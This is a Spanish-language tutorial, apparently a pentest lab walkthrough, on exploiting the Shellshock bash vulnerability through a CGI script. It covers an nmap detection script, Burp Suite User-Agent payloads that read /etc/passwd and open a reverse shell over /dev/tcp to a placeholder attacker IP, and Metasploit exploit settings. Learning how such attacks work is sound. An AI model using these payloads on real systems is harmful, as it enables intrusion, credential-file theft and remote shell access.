<h1 align="center">VULNERABILIDAD SHELLSHOCK</h1>

## **REQUISITOS**

La vulnerabilidad **Shellshock** se utiliza para explotar el bash (desde la versión 1.3), permitiendo la ejecución remota de código. Esto le permite al atacante obtener acceso al sistema a través de una reverse shell.

## **FORMAS DE REALIZAR EL ATAQUE**

- Manualmente con Burp Suite
- Automáticamente con metasploit

## **EJEMPLO**

Por ejemplo, en esta web podemos comprobar que hay un contador hacia atrás, por lo que tiene que haber un script corriendo por detrás para realizar la cuenta atrás:

![image](https://github.com/user-attachments/assets/a9c02697-e43e-42db-88a6-fb3013b17b58)

Si analizamos el código fuente de la página podemos comprobar que por detrás se ejecuta un script cgi llamado gettime.cgi y está ubicado en en el index de la web

![image](https://github.com/user-attachments/assets/3a9c9c8c-92bb-4f05-9fb5-196d70901b18)

![image](https://github.com/user-attachments/assets/2f935b90-01fd-46c4-9cee-37adb4932f54)

## **COMPROBACIÓN**

Para saber si es vulnerable a este ataque tenemos que comprobarlo con un script de nmap:

- `nmap \*ip\* --script=http-shellshock --script-args=”http-shellshock.uri=gettime.cgi”`

![image](https://github.com/user-attachments/assets/38bdd297-853a-4859-8719-8c30ff216f2a)

## **ATAQUE CON BURP SUITE**

Recargar la página donde se encuentra el script gettime.cgi y enviar la solicitud al Repeater.

En repeater, modificaremos el user-agent de la siguiente manera

- `User-Agent: () { :;}; echo; echo; /bin/bash -c 'cat /etc/passwd'`

![image](https://github.com/user-attachments/assets/08b79c37-525f-4cdc-a67e-85b2c9d02a5a)

Y nos devolverá lo siguiente:

![image](https://github.com/user-attachments/assets/9abc9968-abf0-455d-9528-a8af2d70188b)

Si queremos conseguir una reverse shell ponemos netcat a la escucha por el puerto 1234 y ejecutamos esta reverse shell en burp suite:

- `User-Agent: () { :;}; echo; echo; /bin/bash -c ‘bash -i >& /dev/tcp/&lt;attacker_ip&gt;/1234 0>&1’`

![image](https://github.com/user-attachments/assets/3a641b17-46eb-4f43-bb5b-b9b387c9e0fa)

## **ATAQUE CON METASPLOIT**

Para hacer uso de esta vulnerabilidad buscamos “shellshock” en metasploit. Tenemos dos módulos:

- apache_mod_cgi_bash_env (scanner)
- apache_mod_cgi_bash_env_exec (exploit)

Como ya sabemos que es vulnerable hacemos uso del exploit. Las opciones que tenemos que rellenar para conseguir una sesion de meterpreter son:

- RHOSTS
- set TARGETURI /gettime.cgi
- run
